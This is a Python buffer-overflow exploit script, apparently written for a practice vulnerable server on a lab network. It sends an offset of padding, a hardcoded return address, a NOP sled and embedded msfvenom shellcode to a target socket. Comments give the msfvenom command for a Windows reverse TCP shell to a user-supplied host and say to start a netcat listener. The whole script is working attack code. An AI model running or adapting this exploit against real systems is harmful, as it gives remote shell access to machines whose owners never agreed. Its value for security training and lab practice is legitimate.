import socket

ip = "10.10.69.96" #Machine IP
port = 1337 #Server Port

prefix = "OVERFLOW2 " #Server Prefix
offset = 634 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" #Return address
padding = "\x90" * 16 #NOP (No Operation) Padding
payload = ("\xfc\xbb\xcc\xda\x96\x61\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x30\x32\x14"
"\x61\xc8\xc3\x79\xeb\x2d\xf2\xb9\x8f\x26\xa5\x09\xdb\x6a"
"\x4a\xe1\x89\x9e\xd9\x87\x05\x91\x6a\x2d\x70\x9c\x6b\x1e"
"\x40\xbf\xef\x5d\x95\x1f\xd1\xad\xe8\x5e\x16\xd3\x01\x32"
"\xcf\x9f\xb4\xa2\x64\xd5\x04\x49\x36\xfb\x0c\xae\x8f\xfa"
"\x3d\x61\x9b\xa4\x9d\x80\x48\xdd\x97\x9a\x8d\xd8\x6e\x11"
"\x65\x96\x70\xf3\xb7\x57\xde\x3a\x78\xaa\x1e\x7b\xbf\x55"
"\x55\x75\xc3\xe8\x6e\x42\xb9\x36\xfa\x50\x19\xbc\x5c\xbc"
"\x9b\x11\x3a\x37\x97\xde\x48\x1f\xb4\xe1\x9d\x14\xc0\x6a"
"\x20\xfa\x40\x28\x07\xde\x09\xea\x26\x47\xf4\x5d\x56\x97"
"\x57\x01\xf2\xdc\x7a\x56\x8f\xbf\x12\x9b\xa2\x3f\xe3\xb3"
"\xb5\x4c\xd1\x1c\x6e\xda\x59\xd4\xa8\x1d\x9d\xcf\x0d\xb1"
"\x60\xf0\x6d\x98\xa6\xa4\x3d\xb2\x0f\xc5\xd5\x42\xaf\x10"
"\x79\x12\x1f\xcb\x3a\xc2\xdf\xbb\xd2\x08\xd0\xe4\xc3\x33"
"\x3a\x8d\x6e\xce\xad\xb8\x64\xfa\x9b\xd5\x7a\xfa\xf2\xe4"
"\xf2\x1c\x9e\xf6\x52\xb7\x37\x6e\xff\x43\xa9\x6f\xd5\x2e"
"\xe9\xe4\xda\xcf\xa4\x0c\x96\xc3\x51\xfd\xed\xb9\xf4\x02"
"\xd8\xd5\x9b\x91\x87\x25\xd5\x89\x1f\x72\xb2\x7c\x56\x16"
"\x2e\x26\xc0\x04\xb3\xbe\x2b\x8c\x68\x03\xb5\x0d\xfc\x3f"
"\x91\x1d\x38\xbf\x9d\x49\x94\x96\x4b\x27\x52\x41\x3a\x91"
"\x0c\x3e\x94\x75\xc8\x0c\x27\x03\xd5\x58\xd1\xeb\x64\x35"
"\xa4\x14\x48\xd1\x20\x6d\xb4\x41\xce\xa4\x7c\x61\x2d\x6c"
"\x89\x0a\xe8\xe5\x30\x57\x0b\xd0\x77\x6e\x88\xd0\x07\x95"
"\x90\x91\x02\xd1\x16\x4a\x7f\x4a\xf3\x6c\x2c\x6b\xd6\x6c"
"\xd2\x93\xd9") #Payload created with msfvenom, change this for your payload to work

# Use the command: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

# Also make sure you have a netcat listener on the port you set as your LPORT

#After the "\x00" add the rest of your bad characters.
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix #Do not change

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")